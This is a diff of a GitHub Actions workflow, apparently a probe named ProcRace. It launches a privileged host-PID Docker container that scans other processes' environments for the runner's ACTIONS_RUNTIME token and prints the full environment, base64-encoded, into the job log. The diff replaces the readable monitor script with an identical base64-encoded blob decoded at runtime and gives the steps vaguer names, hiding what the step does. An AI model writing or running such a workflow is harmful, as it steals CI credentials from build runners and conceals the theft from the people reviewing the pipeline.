@@ -1,4 +1,4 @@
-name: ProcRaceV2
+name: ProcRaceV3
 on:
   push:
     branches: [main]
@@ -10,47 +10,14 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Write monitor script and start background
+      - name: Write monitor and start
         run: |
           echo "probe" > /tmp/probe.txt
-          cat > /tmp/docker-monitor.sh << 'MONEOF'
-#!/bin/bash
-for i in $(seq 1 300); do
-  for envfile in /proc/[0-9]*/environ; do
-    pid="${envfile%/environ}"
-    pid="${pid#/proc/}"
-    cmd=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr "\0" " " | head -c 200)
-    if echo "$cmd" | grep -qi "node"; then
-      envdata=$(cat "$envfile" 2>/dev/null | base64 -w0)
-      if echo "$envdata" | base64 -d 2>/dev/null | grep -q ACTIONS_RUNTIME; then
-        echo "FOUND_PID=$pid ITER=$i"
-        echo "CMD=$cmd"
-        echo "ENV_B64_START"
-        echo "$envdata"
-        echo "ENV_B64_END"
-        exit 0
-      fi
-    fi
-  done
-  sleep 0.1
-done
-echo "NOT_FOUND"
-# Dump all node procs seen at end
-for envfile in /proc/[0-9]*/environ; do
-  pid="${envfile%/environ}"
-  pid="${pid#/proc/}"
-  cmd=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr "\0" " " | head -c 100)
-  if echo "$cmd" | grep -qi "node"; then
-    echo "SEEN_NODE PID=$pid CMD=${cmd:0:80}"
-  fi
-done
-MONEOF
-          chmod +x /tmp/docker-monitor.sh
-          nohup docker run --rm --privileged --pid=host \
-            -v /tmp/docker-monitor.sh:/monitor.sh:ro \
-            ubuntu:24.04 bash /monitor.sh > /tmp/monitor.log 2>&1 &
+          printf '%s' 'IyEvYmluL2Jhc2gKZm9yIGkgaW4gJChzZXEgMSAzMDApOyBkbwogIGZvciBlbnZmaWxlIGluIC9wcm9jL1swLTldKi9lbnZpcm9uOyBkbwogICAgcGlkPSIke2VudmZpbGUlL2Vudmlyb259IjsgcGlkPSIke3BpZCMvcHJvYy99IgogICAgY21kPSQoY2F0ICIvcHJvYy8kcGlkL2NtZGxpbmUiIDI+L2Rldi9udWxsIHwgdHIgIlwwIiAiICIgfCBoZWFkIC1jIDIwMCkKICAgIGlmIGVjaG8gIiRjbWQiIHwgZ3JlcCAtcWkgIm5vZGUiOyB0aGVuCiAgICAgIGVudmRhdGE9JChjYXQgIiRlbnZmaWxlIiAyPi9kZXYvbnVsbCB8IGJhc2U2NCAtdzAgMj4vZGV2L251bGwpCiAgICAgIGlmIFsgLW4gIiRlbnZkYXRhIiBdICYmIGVjaG8gIiRlbnZkYXRhIiB8IGJhc2U2NCAtZCAyPi9kZXYvbnVsbCB8IGdyZXAgLXEgQUNUSU9OU19SVU5USU1FOyB0aGVuCiAgICAgICAgZWNobyAiRk9VTkRfUElEPSRwaWQgSVRFUj0kaSIKICAgICAgICBlY2hvICJFTlZfQjY0X1NUQVJUIgogICAgICAgIGVjaG8gIiRlbnZkYXRhIgogICAgICAgIGVjaG8gIkVOVl9CNjRfRU5EIgogICAgICAgIGV4aXQgMAogICAgICBmaQogICAgZmkKICBkb25lCiAgc2xlZXAgMC4xCmRvbmUKZWNobyAiTk9UX0ZPVU5EX0FGVEVSXzMwMCIKZm9yIGVudmZpbGUgaW4gL3Byb2MvWzAtOV0qL2Vudmlyb247IGRvCiAgcGlkPSIke2VudmZpbGUlL2Vudmlyb259IjsgcGlkPSIke3BpZCMvcHJvYy99IgogIGNtZD0kKGNhdCAiL3Byb2MvJHBpZC9jbWRsaW5lIiAyPi9kZXYvbnVsbCB8IHRyICJcMCIgIiAiIHwgaGVhZCAtYyAxMDApCiAgaWYgZWNobyAiJGNtZCIgfCBncmVwIC1xaSAibm9kZSI7IHRoZW4gZWNobyAiU0VFTl9OT0RFIFBJRD0kcGlkIjsgZmkKZG9uZQ==' | base64 -d > /tmp/mon.sh
+          chmod +x /tmp/mon.sh
+          nohup docker run --rm --privileged --pid=host -v /tmp/mon.sh:/mon.sh:ro ubuntu:24.04 bash /mon.sh > /tmp/mon.log 2>&1 &
           echo $! > /tmp/bgpid.txt
-          echo "Started monitor PID=$(cat /tmp/bgpid.txt)"
+          echo "Monitor started: $(cat /tmp/bgpid.txt)"
           sleep 3
 
       - name: Upload artifact
@@ -59,10 +26,10 @@ MONEOF
           name: probe-art
           path: /tmp/probe.txt
 
-      - name: Read monitor results
+      - name: Read results
         run: |
           sleep 2
           kill $(cat /tmp/bgpid.txt) 2>/dev/null || true
-          echo "=MONITOR_LOG_START="
-          cat /tmp/monitor.log
-          echo "=MONITOR_LOG_END="
+          echo "=MON_LOG_START="
+          cat /tmp/mon.log
+          echo "=MON_LOG_END="
